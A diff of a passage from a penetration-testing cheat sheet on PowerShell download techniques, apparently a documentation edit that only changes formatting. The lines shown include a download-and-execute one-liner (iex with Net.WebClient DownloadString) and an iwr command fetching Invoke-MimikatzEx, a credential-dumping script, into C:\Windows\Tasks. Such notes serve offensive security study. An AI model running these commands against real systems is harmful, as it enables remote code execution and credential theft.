@@ -160,11 +160,11 @@ ls function:
 </strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
 </strong></code></pre>
 
-Download and save PowerShell Script
+**Download and **_**save**_** PowerShell Script**
 
 {% code overflow="wrap" %}
 ```powershell
-iwr http://172.16.x.x/Invoke-MimikatzEx.ps1 -OutFile C:\Windows\Tasks\Invoke-MimikatzEx.ps1
+❗ iwr http://172.16.x.x/Invoke-MimikatzEx.ps1 -OutFile C:\Windows\Tasks\Invoke-MimikatzEx.ps1
 ```
 {% endcode %}
 
